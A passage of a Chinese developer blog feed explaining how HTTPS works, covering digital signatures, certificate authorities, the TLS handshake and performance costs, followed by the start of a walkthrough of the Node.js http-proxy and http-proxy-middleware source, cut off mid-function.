class="headerlink" title="2、解决报文可能遭篡改问题——数字签名"></a>2、解决报文可能遭篡改问题——数字签名</h3><p>网络传输过程中需要经过很多中间节点，虽然数据无法被解密，但可能被篡改，那如何校验数据的完整性呢？—-校验数字签名。<br /><strong>数字签名有两种功效</strong>：</p><ul><li>能确定消息确实是由发送方签名并发出来的，因为别人假冒不了发送方的签名。</li><li>数字签名能确定消息的完整性,证明数据是否未被篡改过。</li></ul><p><strong>数字签名如何生成:</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216899684-3f5d4d8a-20a9-4758-96a4-9fd9216a54ca.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216899684-3f5d4d8a-20a9-4758-96a4-9fd9216a54ca.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />接收者只有用发送者的公钥才能解密被加密的摘要信息，然后用 HASH 函数对收到的原文产生一个摘要信息，与上一步得到的摘要信息对比。如果相同，则说明收到的信息是完整的，在传输过程中没有被修改，否则说明信息被修改过，因此数字签名能够验证信息的完整性。<br />假设消息传递在 Kobe，James 两人之间发生。James 将消息连同数字签名一起发送给 Kobe，Kobe 接收到消息后，通过校验数字签名，就可以验证接收到的消息就是 James 发送的。当然，这个过程的前提是 Kobe 知道 James 的公钥。问题的关键的是，和消息本身一样，公钥不能在不安全的网络中直接发送给 Kobe,或者说拿到的公钥如何证明是 James 的。<br />此时就需要引入了<strong>证书颁发机构</strong>（Certificate Authority，简称 CA），CA 数量并不多，Kobe 客户端内置了所有受信任 CA 的证书。CA 对 James 的公钥（和其他信息）数字签名后生成证书。<br><a name="XZnPc"></a></p><h3 id="3、解决通信方身份可能被伪装的问题——数字证书"><a href="#3、解决通信方身份可能被伪装的问题——数字证书" class="headerlink" title="3、解决通信方身份可能被伪装的问题——数字证书"></a>3、解决通信方身份可能被伪装的问题——数字证书</h3><p>数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216913635-98e02084-b788-4706-ad18-a16808d21158.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216913635-98e02084-b788-4706-ad18-a16808d21158.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />我们来介绍一下数字证书认证机构的业务流程：</p><ul><li>服务器的运营人员向第三方机构 CA 提交公钥、组织信息、个人信息(域名)等信息并申请认证;</li><li>CA 通过线上、线下等多种手段验证申请者提供信息的真实性，如组织是否存在、企业是否合法，是否拥有域名的所有权等;</li><li>如信息审核通过，CA 会向申请者签发认证文件-证书。证书包含以下信息：申请者公钥、申请者的组织信息和个人信息、签发机构 CA 的信息、有效时间、证书序列号等信息的明文，同时包含一个签名。 其中签名的产生算法：首先，使用散列函数计算公开的明文信息的信息摘要，然后，采用 CA 的私钥对信息摘要进行加密，密文即签名;</li><li>客户端 Client 向服务器 Server 发出请求时，Server 返回证书文件;</li><li>客户端 Client 读取证书中的相关的明文信息，采用相同的散列函数计算得到信息摘要，然后，利用对应 CA 的公钥解密签名数据，对比证书的信息摘要，如果一致，则可以确认证书的合法性，即服务器的公开密钥是值得信赖的。</li><li>客户端还会验证证书相关的域名信息、有效时间等信息; 客户端会内置信任 CA 的证书信息(包含公钥)，如果 CA 不被信任，则找不到对应 CA 的证书，证书也会被判定非法。</li></ul><p><a name="VnaZj"></a></p><h2 id="HTTPS-工作流程"><a href="#HTTPS-工作流程" class="headerlink" title="HTTPS 工作流程"></a>HTTPS 工作流程</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1591153548973-72bc5b03-f83e-4856-ae4d-b635d6226251.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1591153548973-72bc5b03-f83e-4856-ae4d-b635d6226251.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>1.Client 发起一个 HTTPS（比如<code>[https://juejin.im/user/5a9a9cdcf265da238b7d771c](https://juejin.im/user/5a9a9cdcf265da238b7d771c)</code>）的请求，根据 RFC2818 的规定，Client 知道需要连接 Server 的 443（默认）端口。<br />2.Server 把事先配置好的公钥证书（public key certificate）返回给客户端。<br />3.Client 验证公钥证书：比如是否在有效期内，证书的用途是不是匹配 Client 请求的站点，是不是在 CRL 吊销列表里面，它的上一级证书是否有效，这是一个递归的过程，直到验证到根证书（操作系统内置的 Root 证书或者 Client 内置的 Root 证书）。如果验证通过则继续，不通过则显示警告信息。<br />4.Client 使用伪随机数生成器生成加密所使用的对称密钥，然后用证书的公钥加密这个对称密钥，发给 Server。<br />5.Server 使用自己的私钥（private key）解密这个消息，得到对称密钥。至此，Client 和 Server 双方都持有了相同的对称密钥。<br />6.Server 使用对称密钥加密“明文内容 A”，发送给 Client。<br />7.Client 使用对称密钥解密响应的密文，得到“明文内容 A”。<br />8.Client 再次发起 HTTPS 的请求，使用对称密钥加密请求的“明文内容 B”，然后 Server 使用对称密钥解密密文，得到“明文内容 B”。</p><p><a name="uWHqy"></a></p><h2 id="HTTPS-工作原理"><a href="#HTTPS-工作原理" class="headerlink" title="HTTPS 工作原理"></a>HTTPS 工作原理</h2><p>HTTPS 在传输数据之前需要客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。TLS&#x2F;SSL 协议不仅仅是一套加密传输的协议，更是一件经过艺术家精心设计的艺术品，TLS&#x2F;SSL 中使用了非对称加密，对称加密以及 HASH 算法。握手过程的简单描述如下：</p><ul><li>浏览器将自己支持的一套加密规则发送给网站。</li><li>网站从中选出一组加密算法与 HASH 算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。</li><li>获得网站证书之后浏览器要做以下工作：<ul><li>a) 验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。</li><li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。</li><li>使用约定好的 HASH 计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。</li></ul></li><li>4.网站接收浏览器发来的数据之后要做以下的操作：<ul><li>a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证 HASH 是否与浏览器发来的一致。</li><li>b) 使用密码加密一段握手消息，发送给浏览器。</li></ul></li><li>5.浏览器解密并计算握手消息的 HASH，如果与服务端发来的 HASH 一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密。</li></ul><p><a name="cLzva"></a></p><h2 id="HTTP-与-HTTPS-的区别"><a href="#HTTP-与-HTTPS-的区别" class="headerlink" title="HTTP 与 HTTPS 的区别"></a>HTTP 与 HTTPS 的区别</h2><ul><li>HTTP 是明文传输协议，HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 HTTP 协议安全。</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216926835-99e5026c-69dd-4034-9ab9-17678d8b24b8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216926835-99e5026c-69dd-4034-9ab9-17678d8b24b8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />关于安全性，用最简单的比喻形容两者的关系就是卡车运货，HTTP 下的运货车是敞篷的，货物都是暴露的。而 https 则是封闭集装箱车，安全性自然提升不少。</p><ul><li>HTTPS 比 HTTP 更加安全，对搜索引擎更友好，利于 SEO,谷歌、百度优先索引 HTTPS 网页;</li><li>HTTPS 需要用到 SSL 证书，而 HTTP 不用;</li><li>HTTPS 标准端口 443，HTTP 标准端口 80;</li><li>HTTPS 基于传输层，HTTP 基于应用层;</li><li>HTTPS 在浏览器显示绿色安全锁，HTTP 没有显示。</li></ul><p><a name="RSZOV"></a></p><h2 id="HTTPS-的使用成本"><a href="#HTTPS-的使用成本" class="headerlink" title="HTTPS 的使用成本"></a>HTTPS 的使用成本</h2><p><code>HTTPS</code>是一个大趋势</p><ul><li><strong>证书费用以及更新维护</strong><ul><li>证书现在不贵，也有免费的；</li></ul></li><li><strong>HTTPS 降低用户访问速度</strong><ul><li>经过合理的优化（比如<code>SPDY</code>）和部署甚至可以比<code>HTTP1.0</code>快，不过这也是成本之一就是了；</li></ul></li><li><strong>消耗 CPU 资源，需要增加大量机器</strong><ul><li>需要多次计算</li></ul></li></ul><p><a name="eDb4S"></a></p><h2 id="HTTPS-对性能的影响"><a href="#HTTPS-对性能的影响" class="headerlink" title="HTTPS 对性能的影响"></a>HTTPS 对性能的影响</h2><ul><li><strong>协议交互所增加的网络 RTP（往返时延）</strong></li><li><strong>加解密相关计算的耗时</strong><br><a name="CyevJ"></a></li></ul><h3 id="网络耗时"><a href="#网络耗时" class="headerlink" title="网络耗时"></a>网络耗时</h3><p><code>HTTP</code>只需要通过<code>TCP</code>的三次握手就能建立<code>HTTP</code>连接：<br />[<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588932715395-4e136e9c-a03c-4aad-8973-bdf85ec06d43.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588932715395-4e136e9c-a03c-4aad-8973-bdf85ec06d43.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />关于<code>302</code>自动跳转，这是因为，比如访问百度，我们输入网址全称而是输入<code>baidu.com</code>，所以会自动跳转至<code>HTTPS</code>，这本身也需要耗时；<br />并且跳转后，<code>URI</code>不一样了，浏览器要与服务器重新通过三次握手建立<code>TCP</code>连接；<br />之后还要进行<code>TLS</code>协商，比如密钥交换算法，对称加密算法，内容一致性校验算法，证书签名算法等等；浏览器获取到证书后，也需要校验证书的有效性，比如证书是否过期，是否撤销等等；<br />接着，浏览器首先获取证书里的<code>CA</code>域名如果该<code>CA</code>域名没有命中缓存，浏览器需要解析域名的<code>DNS</code>，这个<code>DNS</code>解析至少耗费一个<code>RTP</code>；<br /><code>DNS</code>解析到<code>IP</code>之后就要完成三次握手，建立<code>CA</code>站点的<code>TCP</code>连接，这又耗费一个<code>RTP</code>；<br />再接着浏览器发送<code>OCSP</code>请求，获取响应耗费一个<code>RTP</code>；</p><blockquote><p>关于<code>OCSP</code>：在线证书状态协议，它是维护服务器和其他网络资源安全性的两种普遍模式之一，另外一个叫做<code>CRL</code>证书注销列表；当用户试图访问一个服务器的时候，在线证书状态协议发送一个对于证书状态信息的请求，服务器会回复一个有效、过期、未知的响应；协议规定了服务器和客户端应用程序通信的语法；在线证书协议给了用户到期证书一个宽限期，这样用户就可以在更新证书前的一段时间继续访问服务器，所以这里就需要发起一个对于证书状态的请求，也需要消耗一个<code>RTP</code></p></blockquote><p>最后就是<code>TLS</code>完全握手阶段<code>2</code>，这个阶段主要进行密钥协商，耗时一个<code>RTP</code>；随后进行应用层的<code>TCP</code>数据通信。<br><a name="9QRd7"></a></p><h3 id="计算耗时"><a href="#计算耗时" class="headerlink" title="计算耗时"></a>计算耗时</h3><ul><li>浏览器计算耗时；</li><li>服务器计算耗时。</li></ul><p><a name="qwoNX"></a></p><h2 id="HTTPS-常见问题"><a href="#HTTPS-常见问题" class="headerlink" title="HTTPS 常见问题"></a>HTTPS 常见问题</h2><ul><li><code>HTTPS</code>需要安装证书；</li><li>大型网站比如百度，从<code>HTTP</code>升级为<code>HTTPS</code>比较困难（不能因为升级而降低用户体验这样就本末倒置了）；</li><li><code>HTTPS</code>并不能解决所有安全问题（比如<code>XSS</code>攻击，木马等），只是能更加安全的传输数据。</li></ul><p><a name="JsaBH"></a></p><h2 id="影响-HTTP-网络请求的因素"><a href="#影响-HTTP-网络请求的因素" class="headerlink" title="影响 HTTP 网络请求的因素"></a>影响 HTTP 网络请求的因素</h2><ul><li><strong>带宽</strong></li><li><strong>延迟</strong><ul><li>一条连接上只可发送<strong>一个</strong>请求；</li><li>请求只能从<strong>客户端开始</strong>，客户端不可以接收除响应以外的指令；</li><li>请求&#x2F;响应头部<strong>不经压缩</strong>就发送，每次互相发送<strong>相同</strong>的头部造成的浪费很多；</li><li>非强制压缩发送；</li></ul></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 原理 </tag>
            
            <tag> Https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http-proxy 源码解析以及实现</title>
      <link href="/2019/07/08/frontend/browser/http-proxy-yuan-ma-jie-xi-yi-ji-shi-xian/"/>
      <url>/2019/07/08/frontend/browser/http-proxy-yuan-ma-jie-xi-yi-ji-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="08bd9bc4"></a></p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>这段时间公司进行了前后端的分离，分离开发是如丝般顺滑了，但是却带来一个问题，接口的跨域，会在调试中带来麻烦。<br />现阶段接口跨域的 3 中方式。<br />1.jsonp<br />2.cors<br />3.代理<br />代理（英语：Proxy）也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击。</p><p><a name="cad80607"></a></p><h2 id="代理分类"><a href="#代理分类" class="headerlink" title="代理分类"></a>代理分类</h2><p><strong>1.正向代理</strong><br />正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。</p><p><strong>2.反向代理</strong><br />反向代理（Reverse Proxy）方式是指以代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p><a name="c74360c9"></a></p><h2 id="图解代理"><a href="#图解代理" class="headerlink" title="图解代理"></a>图解代理</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555714-a0737d00-d3b0-4d93-b556-8b2e940c4fe6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555714-a0737d00-d3b0-4d93-b556-8b2e940c4fe6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555777-9e122eae-ed24-4c51-a909-7fe004df403e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555777-9e122eae-ed24-4c51-a909-7fe004df403e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端。<br />反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端。<br />如果以上没看明白可以看下面：<br /><strong>正向代理</strong>：我想去买小明水果，但是我自己懒得去买，我通过一个中介的去帮我跑腿买，即是正向代理，小明水果并不需要知道，我来买水果了。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555752-aa6efb9e-965a-4365-9376-ee6a5c82beea.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555752-aa6efb9e-965a-4365-9376-ee6a5c82beea.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>反向代理</strong>：而在反向代理中，我想吃苹果，我还是懒得去买，但是我和中介说，我想吃苹果，我不关心吃什么苹果，你只要给我拿到一个苹果。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555614-5fb627f6-c290-4545-a98f-55fc26645404.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555614-5fb627f6-c290-4545-a98f-55fc26645404.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="dae4f3ea"></a></p><h2 id="项目中的代理"><a href="#项目中的代理" class="headerlink" title="项目中的代理"></a>项目中的代理</h2><p><a name="h9yEh"></a></p><h4 id="http-proxy-middleware"><a href="#http-proxy-middleware" class="headerlink" title="http-proxy-middleware"></a>http-proxy-middleware</h4><p>这个插件正是我们公司在项目中用到的代理插件，他支持 connect, express and browser-sync，应该来说非常方便，下面是他的使用方式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> proxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy-middleware&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, <span class="title function_">proxy</span>(&#123;<span class="attr">target</span>: <span class="string">&#x27;http://www.example.org&#x27;</span>, <span class="attr">changeOrigin</span>: <span class="literal">true</span>&#125;));</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>查看他的部分源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> httpProxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> configFactory = <span class="built_in">require</span>(<span class="string">&#x27;./config-factory&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> handlers = <span class="built_in">require</span>(<span class="string">&#x27;./handlers&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> contextMatcher = <span class="built_in">require</span>(<span class="string">&#x27;./context-matcher&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">PathRewriter</span> = <span class="built_in">require</span>(<span class="string">&#x27;./path-rewriter&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;./logger&#x27;</span>).<span class="title function_">getInstance</span>()</span><br><span class="line"><span class="keyword">var</span> getArrow = <span class="built_in">require</span>(<span class="string">&#x27;./logger&#x27;</span>).<span class="property">getArrow</span></span><br><span class="line">...省略</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">HttpProxyMiddleware</span></span><br></pre></td></tr></table></figure><p>通过看到他的代码得知他用到了 http-proxy 这个库。</p><p><a name="S106F"></a></p><h4 id="http-proxy"><a href="#http-proxy" class="headerlink" title="http-proxy"></a>http-proxy</h4><p>那我们就来看 http-proxy</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>),</span><br><span class="line">    httpProxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Create a proxy server with custom application logic</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> proxy = httpProxy.<span class="title function_">createProxyServer</span>(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Create your custom server and just call `proxy.web()` to proxy</span></span><br><span class="line"><span class="comment">// a web request to the target passed in the options</span></span><br><span class="line"><span class="comment">// also you can use `proxy.ws()` to proxy a websockets request</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// You can define here your custom logic to handle the request</span></span><br><span class="line">  <span class="comment">// and then proxy the request.</span></span><br><span class="line">  proxy.<span class="title function_">web</span>(req, res, &#123; <span class="attr">target</span>: <span class="string">&#x27;http://127.0.0.1:5060&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on port 5050&quot;</span>)</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">5050</span>);</span><br></pre></td></tr></table></figure><p>目录结构<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589184406366-528ed49a-6443-4115-939f-9f256d94ac77.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589184406366-528ed49a-6443-4115-939f-9f256d94ac77.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>http-proxy.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ProxyServer</span> = <span class="built_in">require</span>(<span class="string">&#x27;./http-proxy/index.js&#x27;</span>).<span class="property">Server</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyServer</span>(<span class="params">options</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProxyServer</span>(options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createProxyServer</span> = createProxyServer;</span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createServer</span>      = createProxyServer;</span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createProxy</span>       = createProxyServer;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">ProxyServer</span>;</span><br></pre></td></tr></table></figure><p>.&#x2F;http-proxy&#x2F;index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> httpProxy = <span class="variable language_">module</span>.<span class="property">exports</span>,</span><br><span class="line">    extend    = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>).<span class="property">_extend</span>,</span><br><span class="line">    parse_url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>).<span class="property">parse</span>,</span><br><span class="line">    <span class="title class_">EE3</span>       = <span class="built_in">require</span>(<span class="string">&#x27;eventemitter3&#x27;</span>),</span><br><span class="line">    http      = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>),</span><br><span class="line">    https     = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>),</span><br><span class="line">    web       = <span class="built_in">require</span>(<span class="string">&#x27;./passes/web-incoming&#x27;</span>),</span><br><span class="line">    ws        = <span class="built_in">require</span>(<span class="string">&#x27;./passes/ws-incoming&#x27;</span>);</span><br><span class="line"></span><br><span class="line">httpProxy.<span class="property">Server</span> = <span class="title class_">ProxyServer</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createRightProxy</span>(<span class="params">type</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">req, res <span class="comment">/*, [head], [opts] */</span></span>) 